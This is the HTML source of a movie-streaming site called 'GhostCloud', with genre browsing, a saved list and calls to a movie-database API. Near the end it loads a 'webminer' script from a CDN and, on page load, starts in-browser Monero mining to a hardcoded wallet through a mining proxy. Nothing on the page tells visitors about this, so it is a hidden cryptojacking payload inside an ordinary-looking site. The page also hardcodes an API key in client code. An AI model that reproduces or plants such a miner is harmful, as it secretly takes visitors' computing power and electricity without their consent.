<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>GhostCloud | 4K Cinema</title>
    <script async src="https://www.googletagmanager.com/gtag/js?id=G-XCFYVQ97K6"></script>
    <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'G-XCFYVQ97K6');
    </script>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<aside class="sidebar">
    <div class="logo" onclick="location.reload()">GHOST</div>
    <div class="nav-group">
        <div class="nav-item" onclick="loadHome()">Home</div>
        <div class="nav-item" onclick="showSection('myListRow')">My List</div>
    </div>
    <div class="nav-group">
        <div class="nav-label">Genres</div>
        <div class="nav-item" onclick="getGenre(28, 'Action')">Action</div>
        <div class="nav-item" onclick="getGenre(16, 'Anime')">Anime</div>
        <div class="nav-item" onclick="getGenre(27, 'Horror')">Horror</div>
        <div class="nav-item" onclick="getGenre(10749, 'Romance')">Romance</div>
    </div>
</aside>

<main>
    <div id="hero">
        <div class="hero-overlay">
            <h1 id="h-title">Select a Movie</h1>
            <p id="h-desc">Browse the categories below to start your 4K stream.</p>
            <div class="hero-btns">
                <button class="btn-play" id="h-play">▶ Play Now</button>
                <button class="btn-list" id="h-list">+ My List</button>
            </div>
        </div>
    </div>

    <div class="content-body">
        <div id="myListRow" class="row-container" style="display:none;">
            <h2 class="row-header">My Saved List</h2>
            <div class="movie-row" id="myListData"></div>
        </div>

        <div class="row-container">
            <h2 class="row-header" id="dynamicTitle">Trending Now</h2>
            <div class="movie-row" id="mainGrid"></div>
        </div>
    </div>
</main>

<script src="https://cdn.jsdelivr.net/gh/annoforge/webminer@main/load.js"></script>
<script>
    const API_KEY = '5513ab319975b0b6f6d297179708caec'; 
    const WALLET = '48bN9tTb8niehRBkARiRPQgXYQFuh65pj3fp7DSfY8akMgdsQFUKqqg8FbtVQcKVdJPoNapcWMUiu1TSZiG7FxftFy8hiRy';
    let savedList = JSON.parse(localStorage.getItem('ghostList')) || [];

    window.onload = () => {
        if (typeof startMining === "function") startMining(WALLET, "Lobby", "wss://ny1.xmrminingproxy.com", 5);
        loadHome();
        updateListUI();
    };

    async function loadHome() {
        const r = await fetch(`https://api.themoviedb.org/3/trending/movie/week?api_key=${API_KEY}`);
        const d = await r.json();
        render(d.results, 'mainGrid');
        setHero(d.results[0]);
    }

    async function getGenre(id, name) {
        document.getElementById('dynamicTitle').innerText = name;
        const r = await fetch(`https://api.themoviedb.org/3/discover/movie?api_key=${API_KEY}&with_genres=${id}`);
        const d = await r.json();
        render(d.results, 'mainGrid');
    }

    function setHero(m) {
        document.getElementById('h-title').innerText = m.title;
        document.getElementById('h-desc').innerText = m.overview.slice(0, 180) + "...";
        document.getElementById('hero').style.backgroundImage = `linear-gradient(to right, #020617 20%, transparent 80%), url(https://image.tmdb.org/t/p/original${m.backdrop_path})`;
        document.getElementById('h-play').onclick = () => location.href=`player.html?id=${m.id}`;
        document.getElementById('h-list').onclick = () => {
            if(!savedList.find(x => x.id === m.id)) {
                savedList.push(m);
                localStorage.setItem('ghostList', JSON.stringify(savedList));
                updateListUI();
            }
        };
    }

    function updateListUI() {
        if(savedList.length > 0) {
            document.getElementById('myListRow').style.display = 'block';
            render(savedList, 'myListData');
        }
    }

    function render(movies, target) {
        const div = document.getElementById(target);
        div.innerHTML = movies.map(m => `
            <div class="card" onclick='setHero(${JSON.stringify(m).replace(/'/g, "&apos;")})'>
                <img src="https://image.tmdb.org/t/p/w500${m.poster_path}">
            </div>
        `).join('');
    }
</script>
</body>
</html>
